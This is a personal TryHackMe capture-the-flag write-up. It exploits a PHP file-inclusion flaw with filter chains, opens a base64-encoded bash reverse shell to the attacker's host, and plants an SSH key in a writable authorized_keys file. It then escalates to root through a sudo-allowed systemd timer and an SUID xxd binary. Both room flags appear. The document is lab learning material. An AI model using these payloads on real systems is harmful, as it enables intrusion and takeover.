
[[TryHackMe]] Room

**Date**: 13/02/25, 14/02/25 
**Target IP**: 10.10.91.107

---
## **Initial Scanning**

### [[nmap]] :

- Every port seems to be open which is wild. Scanning the top 10 ports indicates to me that truly only ports 22 and 80 have anything interesting for the time being as their the only ones which return sensible data.

---
## **Exploration and Enumeration**

There's a `login.php` page. It's an Apache server. Running dirbuster gives me nothing. dirsearch however provides some interesting looking endpoints :

```
Target: http://10.10.91.107/

[16:47:50] Starting: 
[16:48:06] 403 -  276B  - /.ht_wsr.txt
[16:48:06] 403 -  276B  - /.htaccess.bak1
[16:48:06] 403 -  276B  - /.htaccess.orig
[16:48:06] 403 -  276B  - /.htaccess.sample
[16:48:06] 403 -  276B  - /.htaccess.save
[16:48:06] 403 -  276B  - /.htaccess_extra
[16:48:06] 403 -  276B  - /.htaccess_orig
[16:48:06] 403 -  276B  - /.htaccess_sc
[16:48:06] 403 -  276B  - /.htaccessOLD
[16:48:06] 403 -  276B  - /.htaccessBAK
[16:48:06] 403 -  276B  - /.htaccessOLD2
[16:48:06] 403 -  276B  - /.htm
[16:48:06] 403 -  276B  - /.html
[16:48:06] 403 -  276B  - /.htpasswd_test
[16:48:06] 403 -  276B  - /.htpasswds
[16:48:06] 403 -  276B  - /.httr-oauth
[16:48:10] 403 -  276B  - /.php
[16:49:10] 301 -  311B  - /images  ->  http://10.10.91.107/images/
[16:49:10] 200 -  484B  - /images/
[16:49:17] 200 -  370B  - /login.php
[16:49:26] 200 -  254B  - /orders.html
[16:49:40] 403 -  276B  - /server-status/
[16:49:40] 403 -  276B  - /server-status
[16:49:54] 200 -  254B  - /users.html
```

But there's no content part from a header on the actual pages.

Running sqlmap on the login request actually gives me an interesting redirect to `http://10.10.91.107/secret-script.php?file=supersecretadminpanel.html`and indicates that the backend DB is MySQL however it does also say the username parameter a false positive.

The endpoint is an admin panel wit nothing of much note apart from the URL itself.

---
## **Exploitation**

The file parameter allows for path traversal allowing me to arbitrarily read files.

I had to refer to the write-up for this next part. I'm not smart enough to put this together which is annoying.

So, the admin panel URL `http://10.10.91.107/secret-script.php?file=php://filter/resource=messages.html` contains a PHP filter which apparently allows arbitrary PHP code execution and is an interesting vulnerability. LFI2RCE is what i have to look into.

I learnt that the following can help generate php filter chain exploits :
**https://github.com/synacktiv/php_filter_chain_generator

As a trial we can generate a payload to print the phpinfo :

```
❯ python3 php_filter_chain_generator.py --chain="<?php phpinfo(); ?>"

[+] The following gadget chain will generate the following code : <?php phpinfo(); ?> (base64 value: PD9waHAgcGhwaW5mbygpOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-.........
```

And it worked. So we can go ahead now and try and get a reverse shell.

We go about this by uploading the simplest possible php web shell using the following:

```
❯ python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
```

We run the code as follows :

```
http://10.10.91.107/secret-script.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8..........
```

We now have the ability to run arbitrary commands.

Using https://www.revshells.com/ we can generate a Bash -i reverse shell command. The write-up explained that base64 encoding it would help avoid any conflicts with special characters in the URL.

So, to obtain the reverse shell I finally navigate to :

```
http://10.10.91.107/secret-script.php?0=echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuMTIyLjgwLzEzMzcgMD4mMQ==%20|%20base64%20-d%20|%20bash&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv...................
```

Where the actual command for the shell is :

```
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuMTIyLjgwLzEzMzcgMD4mMQ== | base64 -d | bash
```

```
❯ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.4.122.80] from (UNKNOWN) [10.10.91.107] 42486
bash: cannot set terminal process group (821): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cheesectf:/var/www/html$ ls
```

I really need to remember to upgrade the shell using instructions from [[Shell Upgrade]].

We have an upgraded shell as www-data.

---
## **Post-Exploitation**

Run linpeas.

Found an interesting file : `/etc/systemd/system/exploit.timer`

Also we can navigate to the comte user's home directory. Here we find their .ssh folder in which there is an `authorized_keys` file which we can write to.

I can therefore use the following to generate my own SSH key using the following on my host system, copy and echo the public key into the `authorized_keys` file and use the id key to SSH as the comte user: 

```
❯ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:+YaZ67XYzsE1aZ23+vaMUH+qWDuBDDCkR89LOwTQWfI kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|    .+=o.        |
|     o=*         |
|    . .oE        |
|     . o.+   o . |
|        So .= + .|
|         Boo.o o.|
|        + * o. .o|
|         B =.o.=.|
|       .+.* o+=.+|
+----[SHA256]-----+
```

```
❯ ssh -i /home/kali/.ssh/id_rsa comte@10.10.91.107
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-174-generic x86_64)....

comte@cheesectf:~$ 
```

I can then obtain the user flag :

```bash
comte@cheesectf:~$ cat user.txt 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

---
## **Escalation**

Remember that I found an interesting file : `/etc/systemd/system/exploit.timer`.

The comte user has the rights to run this as sudo :

```
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

Reading the file we see : 

```
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

This timer triggers the service `/etc/systemd/system/exploit.service`.

```
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

We see that this service adds the SUID bit to the xxd binary which would allow us to use GTFOBins to escalate our privileges.

But the `exploit.timer` file throws an error when run since OnBootSec isn't set. We can modify the file as follows and run it : 

```
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=0
OnUnitActiveSec=0

[Install]
WantedBy=timers.target
```

```
comte@cheesectf:~$ sudo /bin/systemctl daemon-reload
comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
```

This sets the SUID bit on the xxd binary and allows us to use GTFOBins to read the root flag :

```
comte@cheesectf:~$ ls -al /opt/xxd
-rwsr-sr-x 1 root root 18712 Feb 14 06:42 /opt/xxd

comte@cheesectf:~$ LFILE=/root/root.txt
comte@cheesectf:~$ /opt/xxd "$LFILE" | /opt/xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

---
## **Summary**

- Running sqlmap on the login request provides interesting redirect to `http://10.10.91.107/secret-script.php?file=supersecretadminpanel.html`
- Admin panel URL `http://10.10.91.107/secret-script.php?file=php://filter/resource=messages.html` contains a PHP filter which allows arbitrary PHP code execution.
- Use https://github.com/synacktiv/php_filter_chain_generator to create payloads with shell-code created with https://revshells.com and run it by navigating to http://10.10.91.107/secret-script.php?0=echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjQuMTIyLjgwLzEzMzcgMD4mMQ==%20|%20base64%20-d%20|%20bash&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv... to obtain a reverse shell which can then be upgraded.
- Found writable /.ssh/authorized_keys in the comte user's home folder allowing me to generate my own SSH key on my host system, copy and echo the public key into the `authorized_keys` file and use the id key to SSH as the comte user.
- User Flag : THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
- Fixed the `/etc/systemd/system/exploit.timer` file and ran it to set SUID bit on the xxd binary and then used GTFOBins to read the root flag. 
- Root Flag : THM{dca75486094810807faf4b7b0a929b11e5e0167c}
